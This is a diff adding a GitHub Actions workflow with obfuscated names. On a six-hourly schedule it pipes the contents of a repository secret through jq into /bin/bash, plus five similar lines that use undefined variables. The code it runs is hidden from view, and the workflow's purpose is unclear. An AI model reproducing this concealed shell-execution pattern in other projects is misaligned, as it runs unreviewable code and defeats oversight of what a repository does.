@@ -1,0 +1,22 @@
+name: jishunrongxian
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '19 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: jishunrongxian
+        env:
+          wip5331: ${{ secrets.wip5331 }}
+        run: |
+          echo $wip5331 | jq -r .zs86990 | /bin/bash
+          echo $db6 | jq -r .nm7 | /bin/bash
+          echo $uwq4606 | jq -r .e76 | /bin/bash
+          echo $cluyb201 | jq -r .pyu12 | /bin/bash
+          echo $ztv58 | jq -r .dh74573 | /bin/bash
+          echo $g191 | jq -r .pnyet17599 | /bin/bash
+
